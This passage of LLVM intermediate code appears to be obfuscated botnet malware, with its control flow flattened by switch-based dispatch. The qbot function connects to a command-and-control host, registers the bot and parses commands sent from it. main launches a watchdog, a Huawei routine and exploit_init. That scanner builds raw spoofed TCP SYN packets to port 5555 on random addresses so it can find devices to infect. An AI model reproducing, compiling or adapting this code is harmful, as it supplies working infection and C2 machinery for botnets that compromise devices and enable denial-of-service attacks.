  %48 = select i1 %47, i32 1579015154, i32 -1904668589
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %3, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  call void @free(i8* %53) #6
  store i32 702548811, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %3, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %3, align 4
  store i32 -486580096, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %54, %49, %44, %43, %40, %36, %19, %17, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #6
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -86024625, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -86024625, label %first
    i32 -637677876, label %7
    i32 1362106714, label %8
    i32 996128028, label %11
    i32 -1298745911, label %20
    i32 1288126737, label %24
    i32 1691147267, label %33
    i32 -855848474, label %37
    i32 -1722745894, label %41
    i32 392800003, label %45
    i32 -476664970, label %50
    i32 37565400, label %51
    i32 195146115, label %52
    i32 -336782774, label %53
    i32 661753592, label %59
    i32 -1251503150, label %66
    i32 -1064742902, label %69
    i32 -771890501, label %73
    i32 285826991, label %74
    i32 -1003408648, label %79
    i32 267750646, label %80
    i32 1305057908, label %81
    i32 1916449997, label %84
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 %.reload, 0
  %6 = select i1 %5, i32 -637677876, i32 1362106714
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1916449997, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  %9 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 88, i32 16, i1 false)
  %10 = call i32 @resolve_http()
  store i32 996128028, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @C2, align 4
  %13 = load i32, i32* @C2, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = or i32 %14, 2048
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %15)
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %17, i32* @C2, align 4
  %18 = icmp eq i32 %17, -1
  %19 = select i1 %18, i32 -1298745911, i32 1288126737
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* @C2, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @close(i32 0)
  store i32 1288126737, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0)) #6
  store i32 %25, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %26 = load i32, i32* @c2_bot_port, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #9
  store i16 %28, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %29 = load i32, i32* @C2, align 4
  %30 = call i32 @connect(i32 %29, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16)
  %31 = icmp eq i32 %30, -1
  %32 = select i1 %31, i32 1691147267, i32 195146115
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* @retry, align 4
  %35 = icmp eq i32 %34, 3
  %36 = select i1 %35, i32 -855848474, i32 -1722745894
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* @C2, align 4
  %39 = call i32 @close(i32 %38)
  %40 = call i32 @close(i32 0)
  store i32 37565400, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* @tryagain, align 4
  %43 = icmp eq i32 %42, 1
  %44 = select i1 %43, i32 392800003, i32 -476664970
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* @C2, align 4
  %47 = call i32 @close(i32 %46)
  %48 = load i32, i32* @retry, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* @retry, align 4
  store i32 996128028, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 37565400, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1916449997, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i32 0, i32 0))
  store i32 -336782774, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* @C2, align 4
  %55 = call i64 @read(i32 %54, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i64 1024)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @buffer, align 4
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 661753592, i32 1305057908
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* @buffer, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %61
  store i8 0, i8* %62, align 1
  %63 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0)) #10
  %64 = icmp ne i8* %63, null
  %65 = select i1 %64, i32 -1251503150, i32 -1064742902
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @C2, align 4
  %68 = call i64 @write(i32 %67, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i64 6)
  store i32 -1064742902, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i32 0, i32 0)) #10
  %71 = icmp ne i8* %70, null
  %72 = select i1 %71, i32 -771890501, i32 285826991
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 1305057908, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** @trigger, align 8
  %76 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* %75) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 -1003408648, i32 267750646
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0))
  store i32 267750646, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 -336782774, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* @C2, align 4
  %83 = call i32 @close(i32 %82)
  call void @exit(i32 0) #12
  unreachable

; <label>:84:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %80, %79, %74, %73, %69, %66, %59, %53, %52, %51, %50, %45, %41, %37, %33, %24, %20, %11, %8, %7, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #6
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  store i32 %9, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1532621871, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1532621871, label %first
    i32 -1356000004, label %12
    i32 1562602769, label %13
    i32 2004497390, label %17
    i32 874928243, label %18
    i32 -1339236206, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %10 = icmp eq i32 %.reload, 0
  %11 = select i1 %10, i32 -1356000004, i32 1562602769
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  call void (...) bitcast (void ()* @huawei_init to void (...)*)()
  store i32 -1339236206, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %6, align 4
  %15 = icmp eq i32 %14, 1
  %16 = select i1 %15, i32 2004497390, i32 874928243
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  call void (...) bitcast (void ()* @exploit_init to void (...)*)()
  store i32 874928243, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -1339236206, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %3, align 4
  ret i32 %20

loopEnd:                                          ; preds = %18, %17, %13, %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @exploit_scanner_pid, align 4
  %35 = load i32, i32* @exploit_scanner_pid, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -51945857, i32* %switchVar
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -51945857, label %first
    i32 -1285647073, label %38
    i32 -2111173457, label %42
    i32 -1529261389, label %43
    i32 550710420, label %49
    i32 382610668, label %53
    i32 134765241, label %64
    i32 1562922388, label %67
    i32 818433896, label %71
    i32 456206384, label %72
    i32 -438581503, label %83
    i32 1994751044, label %86
    i32 1868396686, label %87
    i32 1574687275, label %91
    i32 -820096297, label %97
    i32 -972643207, label %143
    i32 -591282943, label %148
    i32 1883462767, label %150
    i32 104684887, label %154
    i32 368739100, label %209
    i32 -1709452472, label %212
    i32 445876241, label %213
    i32 -769521653, label %214
    i32 -1569697915, label %231
    i32 903375643, label %236
    i32 -830251068, label %241
    i32 1652302816, label %242
    i32 -755096992, label %247
    i32 1109186992, label %248
    i32 -454786557, label %255
    i32 1492458642, label %256
    i32 2048802721, label %263
    i32 1800971877, label %264
    i32 853292370, label %273
    i32 -319402820, label %274
    i32 1346270975, label %283
    i32 -872171988, label %284
    i32 484192855, label %292
    i32 991077871, label %293
    i32 -1320838439, label %301
    i32 261144939, label %302
    i32 -1519609505, label %310
    i32 -983920055, label %311
    i32 1297401458, label %319
    i32 -2073669033, label %320
    i32 1586677976, label %332
    i32 174903693, label %333
    i32 -1661320666, label %335
    i32 -251688624, label %339
    i32 1203669246, label %348
    i32 -2019807105, label %354
    i32 -2104576714, label %355
    i32 371970266, label %358
    i32 1277688829, label %362
    i32 -978850611, label %363
    i32 -659945137, label %375
    i32 1208370666, label %376
    i32 592981134, label %385
    i32 -840076388, label %386
    i32 -420402518, label %395
    i32 1951427156, label %396
    i32 1719850364, label %400
    i32 133059228, label %410
    i32 450439605, label %419
    i32 -2082267052, label %431
    i32 1707209386, label %437
    i32 1633873587, label %443
    i32 260764276, label %449
    i32 -581207218, label %471
    i32 -152296313, label %475
    i32 -1004395502, label %476
    i32 -1900775709, label %482
    i32 -43210111, label %504
    i32 -1079715738, label %508
    i32 894232763, label %509
    i32 1854909961, label %510
    i32 1755264721, label %511
    i32 1492732017, label %514
    i32 213691227, label %521
    i32 1956690409, label %523
    i32 -550932335, label %525
    i32 1378769907, label %530
    i32 -1511524521, label %534
    i32 -2041434998, label %544
    i32 -1353425418, label %545
    i32 -1908548070, label %563
    i32 1341658493, label %572
    i32 -247565742, label %576
    i32 287938124, label %582
    i32 -422702542, label %607
    i32 1107828190, label %613
    i32 1464374826, label %622
    i32 1118806562, label %625
    i32 1519145765, label %626
    i32 -2068495245, label %627
    i32 474824350, label %636
    i32 1765219740, label %637
    i32 1630729706, label %655
    i32 -475883324, label %656
    i32 1630207088, label %662
    i32 1212297442, label %663
    i32 1518810170, label %669
    i32 -1484944710, label %681
    i32 143701741, label %702
    i32 -195442174, label %704
    i32 -1400367090, label %708
    i32 -28477629, label %713
    i32 -230335934, label %718
    i32 -677603252, label %724
    i32 1087619995, label %730
    i32 -20722418, label %742
    i32 1185539156, label %743
    i32 -2009609103, label %761
    i32 -1924758780, label %762
    i32 560828450, label %763
    i32 1579678782, label %766
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp sgt i32 %.reload, 0
  %37 = select i1 %36, i32 -2111173457, i32 -1285647073
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* @exploit_scanner_pid, align 4
  %40 = icmp eq i32 %39, -1
  %41 = select i1 %40, i32 -2111173457, i32 -1529261389
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  ret void

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i32 @util_local_addr()
  store i32 %44, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %45 = call i64 @time(i64* null) #6
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* @exploit_fake_time, align 4
  %47 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %48 = bitcast i8* %47 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %48, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  store i32 550710420, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  %51 = icmp slt i32 %50, 128
  %52 = select i1 %51, i32 382610668, i32 1562922388
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i64 %56
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 2
  store i32 0, i32* %58, align 8
  %59 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 0
  store i32 -1, i32* %63, align 8
  store i32 134765241, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %1, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %1, align 4
  store i32 550710420, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %68, i32* @exploit_rsck, align 4
  %69 = icmp eq i32 %68, -1
  %70 = select i1 %69, i32 818433896, i32 456206384
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* @exploit_rsck, align 4
  %74 = load i32, i32* @exploit_rsck, align 4
  %75 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 3, i32 0)
  %76 = or i32 2048, %75
  %77 = call i32 (i32, i32, ...) @fcntl(i32 %73, i32 4, i32 %76)
  store i32 1, i32* %1, align 4
  %78 = load i32, i32* @exploit_rsck, align 4
  %79 = bitcast i32* %1 to i8*
  %80 = call i32 @setsockopt(i32 %78, i32 0, i32 3, i8* %79, i32 4) #6
  %81 = icmp ne i32 %80, 0
  %82 = select i1 %81, i32 -438581503, i32 1994751044
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i32, i32* @exploit_rsck, align 4
  %85 = call i32 @close(i32 %84)
  call void @exit(i32 0) #12
  unreachable

; <label>:86:                                     ; preds = %loopEntry
  store i32 1868396686, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = call i32 @rand_next()
  %89 = and i32 %88, 65535
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %2, align 2
  store i32 1574687275, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i16, i16* %2, align 2
  %93 = call zeroext i16 @ntohs(i16 zeroext %92) #9
  %94 = zext i16 %93 to i32
  %95 = icmp slt i32 %94, 1024
  %96 = select i1 %95, i32 1868396686, i32 -820096297
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %98 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i64 1
  %100 = bitcast %struct.iphdr* %99 to %struct.anon.0*
  store %struct.anon.0* %100, %struct.anon.0** %4, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %102 = bitcast %struct.iphdr* %101 to i8*
  %103 = load i8, i8* %102, align 4
  %104 = and i8 %103, -16
  %105 = or i8 %104, 5
  store i8 %105, i8* %102, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = bitcast %struct.iphdr* %106 to i8*
  %108 = load i8, i8* %107, align 4
  %109 = and i8 %108, 15
  %110 = or i8 %109, 64
  store i8 %110, i8* %107, align 4
  %111 = call zeroext i16 @htons(i16 zeroext 40) #9
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = call i32 @rand_next()
  %115 = trunc i32 %114 to i16
  %116 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 5
  store i8 64, i8* %119, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 6
  store i8 6, i8* %121, align 1
  %122 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %123 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 1
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %2, align 2
  %126 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %127 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %126, i32 0, i32 0
  store i16 %125, i16* %127, align 4
  %128 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %129 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -241
  %132 = or i16 %131, 80
  store i16 %132, i16* %129, align 4
  %133 = call i32 @rand_next()
  %134 = and i32 %133, 65535
  %135 = trunc i32 %134 to i16
  %136 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %137 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %136, i32 0, i32 5
  store i16 %135, i16* %137, align 2
  %138 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -513
  %142 = or i16 %141, 512
  store i16 %142, i16* %139, align 4
  store i32 -972643207, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %144 = load i32, i32* @exploit_fake_time, align 4
  %145 = load i32, i32* %10, align 4
  %146 = icmp ne i32 %144, %145
  %147 = select i1 %146, i32 -591282943, i32 445876241
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* @exploit_fake_time, align 4
  store i32 %149, i32* %10, align 4
  store i32 0, i32* %1, align 4
  store i32 1883462767, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %1, align 4
  %152 = icmp slt i32 %151, 160
  %153 = select i1 %152, i32 104684887, i32 -1709452472
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %155, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i64 1
  %158 = bitcast %struct.iphdr* %157 to %struct.anon.0*
  store %struct.anon.0* %158, %struct.anon.0** %16, align 8
  %159 = call i32 @rand_next()
  %160 = trunc i32 %159 to i16
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i32, i32* @LOCAL_ADDR, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = call i32 @get_random_ip()
  %167 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 7
  store i16 0, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = bitcast %struct.iphdr* %171 to i16*
  %173 = call zeroext i16 @checksum_generic(i16* %172, i32 20)
  %174 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 7
  store i16 %173, i16* %175, align 2
  %176 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %177 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %178 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  %181 = load i32, i32* %180, align 4
  %182 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %183 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %182, i32 0, i32 2
  store i32 %181, i32* %183, align 4
  %184 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %185 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %184, i32 0, i32 6
  store i16 0, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %188 = bitcast %struct.anon.0* %187 to i8*
  %189 = call zeroext i16 @htons(i16 zeroext 20) #9
  %190 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %186, i8* %188, i16 zeroext %189, i32 20)
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 6
  store i16 %190, i16* %192, align 4
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %193, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %198 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %197, i32 0, i32 0
  store i32 %196, i32* %198, align 4
  %199 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 1
  %201 = load i16, i16* %200, align 2
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %201, i16* %202, align 2
  %203 = load i32, i32* @exploit_rsck, align 4
  %204 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %205 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %205, %struct.sockaddr** %204, align 8
  %206 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %207 = load %struct.sockaddr*, %struct.sockaddr** %206, align 8
  %208 = call i64 @sendto(i32 %203, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %207, i32 16)
  store i32 368739100, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i32, i32* %1, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %1, align 4
  store i32 1883462767, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  store i32 445876241, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %215 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %216 = bitcast i8* %215 to %struct.iphdr*
  store %struct.iphdr* %216, %struct.iphdr** %20, align 8
  %217 = load %struct.iphdr*, %struct.iphdr** %20, align 8
